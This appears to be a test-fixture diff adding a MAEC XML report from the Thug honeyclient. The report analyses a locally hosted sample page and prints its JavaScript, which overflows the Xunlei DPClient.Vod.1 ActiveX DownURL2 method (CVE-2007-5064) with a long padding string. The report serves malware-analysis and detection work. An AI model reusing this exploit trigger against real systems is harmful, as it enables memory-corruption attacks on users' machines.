@@ -1,0 +1,63 @@
+<MAEC_Bundle xmlns:ns1="http://xml/metadataSharing.xsd" xmlns="http://maec.mitre.org/XMLSchema/maec-core-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maec.mitre.org/XMLSchema/maec-core-1 file:MAEC_v1.1.xsd" id="maec:thug:bnd:1" schema_version="1.100000">
+    <Analyses>
+        <Analysis start_datetime="2012-12-11 20:54:53.686680" id="maec:thug:ana:2" analysis_method="Dynamic">
+            <Subject>
+                <Object object_name="http://127.0.0.1/thug/samples/./exploits/DPClient.htm" type="URI" id="maec:thug:obj:3">
+                    <Associated_Code>
+                        <Associated_Code_Snippet>
+                            <Code_Snippet language="Javascript" id="maec:thug:cde:7">
+                                <Discovery_Method tool_id="maec:thug:tol:6" method="Dynamic Analysis"/>
+                                <Code_Segment>
+					   
+					var b1u1231ff312er='';  
+					
+					while (b1u1231ff312er.length &lt; 4057) b1u1231ff312er+="\x0a\x0a\x0a\x0a";    
+					b1u1231ff312er+="\x0a";    
+					b1u1231ff312er+="\x0a";    
+					b1u1231ff312er+="\x0a";    
+					b1u1231ff312er+="\x0a\x0a\x0a\x0a";    
+					b1u1231ff312er+="\x0a\x0a\x0a\x0a";     
+					var yes="1111";    
+					target.DownURL2(b1u1231ff312er,yes,yes,yes);    
+					var IsNop1236326312 = '';    
+					   
+				</Code_Segment>
+                            </Code_Snippet>
+                            <Nature_Of_Relationship>Contained_Inside</Nature_Of_Relationship>
+                        </Associated_Code_Snippet>
+                    </Associated_Code>
+                    <Internet_Object_Attributes>
+                        <URI>http://127.0.0.1/thug/samples/./exploits/DPClient.htm</URI>
+                    </Internet_Object_Attributes>
+                </Object>
+            </Subject>
+            <Tools_Used>
+                <Tool id="maec:thug:tol:1">
+                    <Name>Thug</Name>
+                    <Version>0.4.9</Version>
+                    <Organization>The Honeynet Project</Organization>
+                </Tool>
+            </Tools_Used>
+        </Analysis>
+    </Analyses>
+    <Behaviors>
+        <Behavior id="maec:thug:bhv:4">
+            <Description>
+                <Text>[HTTP] URL: http://127.0.0.1/thug/samples/./exploits/DPClient.htm (Status: 200, Referrer: None)</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:5" method="Dynamic Analysis"/>
+        </Behavior>
+        <Behavior id="maec:thug:bhv:8">
+            <Purpose>
+                <Attempted_Vulnerability_Exploit vulnerability_type="Known">
+                    <Known_Exploit cve_id="CVE-2007-5064"/>
+                </Attempted_Vulnerability_Exploit>
+            </Purpose>
+            <Description>
+                <Text>[Xunlei DPClient.Vod.1 ActiveX] DownURL2 Method Buffer Overflow</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:9" method="Dynamic Analysis"/>
+        </Behavior>
+    </Behaviors>
+    <Pools/>
+</MAEC_Bundle>
